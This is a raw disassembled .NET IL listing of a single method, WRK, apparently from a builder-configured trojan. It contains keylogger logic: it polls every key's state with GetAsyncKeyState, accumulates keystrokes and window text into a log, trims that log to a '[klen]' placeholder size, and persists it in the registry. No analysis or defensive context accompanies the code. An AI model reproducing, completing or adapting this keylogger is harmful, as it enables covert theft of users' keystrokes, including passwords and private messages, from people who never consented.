  .method public instance void  WRK() cil managed
  {
    // Code size       269 (0x10d)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                                      object)
    IL_0011:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0016:  stfld      string j.kl::Logs
    .try
    {
      IL_001b:  ldc.i4.0
      IL_001c:  stloc.0
      IL_001d:  ldloc.0
      IL_001e:  ldc.i4.1
      IL_001f:  add.ovf
      IL_0020:  stloc.0
      IL_0021:  ldc.i4.0
      IL_0022:  stloc.1
      IL_0023:  ldloc.1
      IL_0024:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_0029:  ldc.i4     0xffff8001
      IL_002e:  ceq
      IL_0030:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0035:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_003f:  ldc.i4.0
      IL_0040:  ceq
      IL_0042:  and
      IL_0043:  brfalse.s  IL_0088

      IL_0045:  ldloc.1
      IL_0046:  stloc.2
      IL_0047:  ldarg.0
      IL_0048:  ldloc.2
      IL_0049:  callvirt   instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_004e:  stloc.3
      IL_004f:  ldloc.3
      IL_0050:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0055:  ldc.i4.0
      IL_0056:  ble.s      IL_0081

      IL_0058:  ldarg.0
      IL_0059:  ldarg.0
      IL_005a:  ldfld      string j.kl::Logs
      IL_005f:  ldarg.0
      IL_0060:  callvirt   instance string j.kl::AV()
      IL_0065:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006a:  stfld      string j.kl::Logs
      IL_006f:  ldarg.0
      IL_0070:  ldarg.0
      IL_0071:  ldfld      string j.kl::Logs
      IL_0076:  ldloc.3
      IL_0077:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_007c:  stfld      string j.kl::Logs
      IL_0081:  ldarg.0
      IL_0082:  ldloc.2
      IL_0083:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_0088:  ldloc.1
      IL_0089:  ldc.i4.1
      IL_008a:  add.ovf
      IL_008b:  stloc.1
      IL_008c:  ldloc.1
      IL_008d:  ldc.i4     0xff
      IL_0092:  ble.s      IL_0023

      IL_0094:  ldloc.0
      IL_0095:  ldc.i4     0x3e8
      IL_009a:  bne.un.s   IL_00f2

      IL_009c:  ldc.i4.0
      IL_009d:  stloc.0
      IL_009e:  ldstr      "[klen]"
      IL_00a3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00a8:  ldc.i4     0x400
      IL_00ad:  mul.ovf
      IL_00ae:  stloc.s    V_4
      IL_00b0:  ldarg.0
      IL_00b1:  ldfld      string j.kl::Logs
      IL_00b6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00bb:  ldloc.s    V_4
      IL_00bd:  ble.s      IL_00df

      IL_00bf:  ldarg.0
      IL_00c0:  ldarg.0
      IL_00c1:  ldfld      string j.kl::Logs
      IL_00c6:  ldc.i4.0
      IL_00c7:  ldarg.0
      IL_00c8:  ldfld      string j.kl::Logs
      IL_00cd:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d2:  ldloc.s    V_4
      IL_00d4:  sub.ovf
      IL_00d5:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00da:  stfld      string j.kl::Logs
      IL_00df:  ldarg.0
      IL_00e0:  ldfld      string j.kl::vn
      IL_00e5:  ldarg.0
      IL_00e6:  ldfld      string j.kl::Logs
      IL_00eb:  ldc.i4.1
      IL_00ec:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f1:  pop
      IL_00f2:  ldc.i4.1
      IL_00f3:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00f8:  br         IL_001d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00fd:  dup
      IL_00fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0103:  stloc.s    V_5
      IL_0105:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010a:  leave.s    IL_010c

    }  // end handler
    IL_010c:  ret
  } // end of method kl::WRK
